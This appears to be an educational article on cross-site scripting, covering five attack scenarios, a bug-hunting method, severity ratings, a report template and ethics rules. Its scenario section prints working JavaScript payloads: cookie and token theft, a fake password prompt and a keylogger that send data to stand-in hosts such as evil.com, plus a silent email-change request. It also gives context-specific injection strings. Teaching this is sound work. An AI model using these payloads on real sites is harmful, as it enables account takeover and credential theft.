@@ -1,0 +1,179 @@
+# Cross-Site Scripting (XSS): Real-World Attack Scenarios & Bug Hunter Methodology
+
+Web security learners frequently ask: **"What does an XSS attack actually achieve beyond showing an `alert(1)` pop-up?"** and **"How do professional bug hunters systematically discover, verify, and report XSS findings to get them triaged and awarded bounties?"**
+
+An `alert(1)` dialog is merely a Proof of Concept proving that arbitrary JavaScript executes in the target application's context. In real-world exploitation, injected JavaScript operates with the **full authority (*Same-Origin Privileges*)** of the victim's session.
+
+---
+
+## 1. Infographic: Beyond alert(1) to Real-World Impact & Bug Hunter Methodology
+
+![XSS Real World and Bug Hunting](/images/xss-real-world-hunter.svg)
+
+---
+
+## 2. Five Real-World XSS Attack Scenarios
+
+Here is how attackers leverage XSS in real-world environments:
+
+---
+
+### Scenario 1: Token & Session Hijacking (Account Takeover)
+When authentication tokens are stored in `localStorage` or non-HttpOnly cookies, an attacker can exfiltrate them immediately to an external listener:
+
+```javascript
+// Silently transmitting victim's token/cookie to attacker webhook
+fetch('https://evil-hacker.com/steal?data=' + encodeURIComponent(
+  localStorage.getItem('token') || document.cookie
+));
+```
+
+**Impact:** The attacker gains the session token and authenticates as the victim from any device without knowing their password!
+
+---
+
+### Scenario 2: Silent Background State Changes
+Attackers do not need to steal tokens if they can instruct the victim's browser to execute state-changing actions on the spot:
+
+```javascript
+// Automatically updates victim's profile email in the background
+fetch('/api/user/change-email', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + localStorage.getItem('token')
+  },
+  body: JSON.stringify({ email: 'hacker@evil.com' })
+});
+```
+
+**Impact:** The victim's account email updates instantly without any visible user interaction (*Full Account Takeover*).
+
+---
+
+### Scenario 3: In-Session Phishing (DOM Defacement)
+A deceptive overlay injected directly into the authentic DOM:
+
+```javascript
+document.body.innerHTML = `
+  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;text-align:center;padding-top:100px;">
+    <h2>Your Session Has Expired</h2>
+    <p>Please enter your password to continue:</p>
+    <input type="password" id="pass" placeholder="Password" />
+    <button onclick="fetch('https://evil.com/loot?p=' + document.getElementById('pass').value)">Login</button>
+  </div>
+`;
+```
+
+**Why Victims Fall for It:**
+The browser address bar continues to show the authentic URL (`https://bank.com` with a valid green HTTPS padlock), making it indistinguishable from a legitimate session timeout prompt.
+
+---
+
+### Scenario 4: Live Keystroke Logging
+Injecting event listeners to capture everything typed in real time:
+
+```javascript
+document.addEventListener('keypress', (e) => {
+  // Transmits each key press to the attacker server
+  new Image().src = 'https://evil.com/log?key=' + e.key;
+});
+```
+
+**Impact:** Credit card numbers, private messages, new passwords, and personal records are intercepted live.
+
+---
+
+### Scenario 5: Self-Propagating XSS Worms
+When XSS occurs in social features (comments, user bios, wall posts):
+
+1. Victim Alice visits the attacker's infected profile.
+2. The payload executes in Alice's browser.
+3. The script sends a friend request to the attacker **and replicates the malicious payload into Alice's own bio!**
+4. Anyone visiting Alice's profile gets infected, exponentially cascading across the entire user base (e.g. the historic **Samy Worm on MySpace** that infected 1 million users within 20 hours).
+
+---
+
+## 3. Bug Hunter Methodology: 4-Step Discovery Protocol
+
+Professional bug hunters follow a systematic 4-step workflow:
+
+```text
+[ 1. Inject Canary String ] ──► [ 2. Inspect Output Context ] ──► [ 3. Check Unescaped Chars ] ──► [ 4. Execute Context PoC ]
+ (e.g. testxss123'"<>)           (HTML / JS / Attr / Angular)          (Check if quotes/tags survive)     (alert(document.domain))
+```
+
+### Step 1: Inject a Unique Canary String
+Avoid heavy payloads like `<script>alert(1)</script>` initially, as they can trigger WAFs without indicating which specific character was blocked. Use a clean canary:
+```text
+hunter123'"<>/
+```
+
+### Step 2: Locate Output (Sink) in DevTools / View Source
+Inspect the DOM for `hunter123` and identify its enclosing context:
+* **HTML Body:** `<div>Results: hunter123'"<>/</div>`
+* **Attribute Context:** `<input value="hunter123'"<>/">` or `<a href="hunter123'">`
+* **Script Block Context:** `<script>var query = "hunter123'"<>/";</script>`
+
+### Step 3: Analyze Unescaped Characters
+Verify if special characters were converted to HTML entities:
+* If `<` becomes `&lt;` and `"` becomes `&quot;`, new tags cannot be injected.
+* If `'` or `"` **remain raw and unescaped** inside attributes or script blocks, a **Breakout** is possible!
+
+### Step 4: Deploy Context-Specific Payload
+* Inside `<a href="...">` → `javascript:alert(document.domain)`
+* Inside HTML Body → `<img src=x onerror=alert(document.domain)>`
+* Inside `<script>` → `"-alert(document.domain)-"`
+
+---
+
+## 4. Official Bug Bounty Reporting Standards
+
+Top bug bounty platforms (HackerOne, Bugcrowd, Intigriti) mandate non-destructive, origin-proving PoCs:
+
+### Why `alert(document.domain)` is the Industry Standard
+Displaying the genuine domain inside the alert box proves code execution occurred within the authentic target origin, clearly distinguishing valid findings from external sandbox environments.
+
+### Severity Classifications:
+| XSS Type | Impact Description | Standard Severity |
+| :--- | :--- | :--- |
+| **Reflected XSS** | Requires user interaction (clicking a crafted link). | **Medium (CVSS ~6.1)** |
+| **Stored XSS** | Persisted in database; triggers automatically for all visitors (0-Click). | **High (CVSS ~8.0 - 8.8)** |
+| **DOM-based XSS** | Client-side manipulation via vulnerable sinks (`innerHTML`, `eval()`). | **Medium - High** |
+
+---
+
+## 5. Ready-to-Submit Bug Bounty Report Template
+
+```markdown
+### Summary
+Reflected Cross-Site Scripting (XSS) vulnerability was identified on the `/search` endpoint via the `query` parameter. This allows an attacker to execute arbitrary JavaScript in the victim's browser context.
+
+### Vulnerable Endpoint & Parameter
+- **URL:** `https://target.com/search?query=PAYLOAD`
+- **Parameter:** `query` (GET)
+
+### Steps to Reproduce
+1. Log in to the application as a standard user.
+2. Navigate to the following crafted URL:
+   `https://target.com/search?query=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E`
+3. Observe that an alert pop-up displaying `target.com` is rendered immediately upon page load.
+
+### Proof of Concept (Screenshot)
+[Attach screenshot showing alert(document.domain) with visible address bar]
+
+### Impact
+An attacker can trick authenticated users into visiting this URL, leading to session hijacking, in-session phishing, or unauthorized state-changing actions on behalf of the victim.
+
+### Remediation
+- Implement context-aware output encoding (e.g., HTML Entity Encoding).
+- Implement a robust Content Security Policy (CSP) restricting inline scripts.
+```
+
+---
+
+## 6. Golden Rules & Ethics for Bug Hunters
+
+1. **Never Test on Live Users:** Always configure 2 test accounts you control (Account A as attacker, Account B as victim).
+2. **Clean Up Stored Payloads:** Immediately delete test comments/posts after capturing screenshot evidence.
+3. **Never Steal Real Data:** Keep PoCs strictly non-destructive (`alert(document.domain)` or `console.log(document.origin)`).
